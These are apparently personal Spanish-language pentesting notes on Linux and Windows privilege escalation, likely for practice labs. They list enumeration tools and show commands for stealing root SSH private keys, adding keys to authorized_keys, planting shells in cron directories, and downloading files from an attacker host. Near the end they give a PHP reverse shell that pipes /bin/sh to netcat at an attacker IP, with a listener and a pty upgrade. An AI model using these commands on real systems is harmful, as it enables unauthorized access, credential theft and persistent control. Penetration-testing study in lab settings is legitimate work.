Herramientas de enumeraciÃ³n de informacion (Dentro del sistema - Mucho ruido)

Linux: [https://github.com/rebootuser/LinEnum.git](https://github.com/rebootuser/LinEnum.git)
        https://github.com/sleventyeleven/linuxprivchecker
Windows: https://github.com/GhostPack/Seatbelt
        https://github.com/411Hall/JAWS
General: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite (se ejecuta y automaticamente recopila)


Lista de exploits basados en los permisos que se tengan "sudoers"
Linux: https://gtfobins.github.io/
Windows: https://lolbas-project.github.io/#

Aprovechar tareas programaddas para que se ejecuten exploits a intervalos constantes

Credenciaes expuestas en Archivos de Logs
Linux: bash_historyen 
Windows: PSReadLine

Claves SSH privadas (Si esque se tiene acceso)
/home/user/.ssh/id_rsa o /root/.ssh/id_rsa

```
[!bash!]$ vim id_rsa
[!bash!]$ chmod 600 id_rsa #Se cambian los permisos, ya que si varios usuarios tienen acceso a las claves el servidor SSH la inhabilitara
[!bash!]$ ssh root@10.10.10.10 -i id_rsa
```

_______________________________________________________________

Listas de verificacion de escalada de privilegios

Linux: https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html
Windows: https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html

Scripst de Eumeracion Automatica

Linux:
- https://github.com/rebootuser/LinEnum 
- https://github.com/sleventyeleven/linuxprivchecker

Windows:
- https://github.com/GhostPack/Seatbelt
- https://github.com/411Hall/JAWS

Windows/Linux/Mac: https://github.com/peass-ng/PEASS-ng (> ./linpeas.sh)

Busqueda de software vulnerable:
dpkg -l
C:\Program Files

Comrpobar permisos de usuario
sudo -l #Verificar sobre que tiene permisos de ejecucion
User user1 may run the following commands on ExampleServer:
    (ALL : ALL) ALL    #(user : user) NOPASSWD: /bin/echo --> En este el usuario puede ejecutar comandos desde "/bin/echo" sin credenciales  
sudo su - #Y podremos ejecuar todos los comandos como root - Solo si aparece el resultado anterior

Aagregar Archivos (Shell, virus, etc)
En algunas ocaciones se tiene acceso a los siguientes directorios, los cuales ejecutan programas cada cierto intervalo de tiempo, y pueden no validarlo.
/etc/crontab
/etc/cron.d
/var/spool/cron/crontabs/root


Claves SSH
Aveces se suelen tener permisos de lectura sobre algunos de estos archivos que contienen la clave privada de SSH:
/home/user/.ssh/id_rsa
/root/.ssh/id_rsa

cat /home/user/.ssh/id_rsa #Se imprime y copia el contenido de la llave privada
vim id_rsa  #Se pega la llave
chmod 600 id_rsa  #Se le dan permisos estrictos ya que si el servidor SSH detecta que varios usuarios tenen permisos sobre esa clarve, la bloquea
ssh root@10.10.10.10 -p 22 -i id_rsa #Se conecta a traves de la llave

Generar Key
Tambien si se tienen permisos de escitura se puede generar una llave privada, y agregarla a "/root/.ssh/authorized_keys" con "ssh-keygen -f key"


____________________________________________________

Transferencia de archvos

Desde el host remoto se pueden usar varios comandos para descargar o llevar contenido desde nuestro host de atacante:
python3 -m http.server 8000
wget http://10.10.14.1:8000/linenum.sh

curl http://10.10.14.1:8000/linenum.sh -o linenum.sh

scp linenum.sh user@remotehost:/tmp/linenum.sh

Usando Base64
base64 shell -w 0
echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell

file shell #Se verifica el tipo de archivo, si es shell es un tipo de bnario y si es exportable


_______________________________________

Herramientas de manejo de consola Bash/Powershell

PowerShell: https://underthewire.tech/wargames
Bash: https://overthewire.org/wargames/

Write-Up: https://0xdf.gitlab.io/

_____________________________________

Codigo php de prueba
<?php system('id'); ?>

Shell inverso e PHP
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>

Modo escucha co Netcat
nc -lvnp 9443

Terminal amigable
python3 -c 'import pty; pty.spawn("/bin/bash")'
_____________________







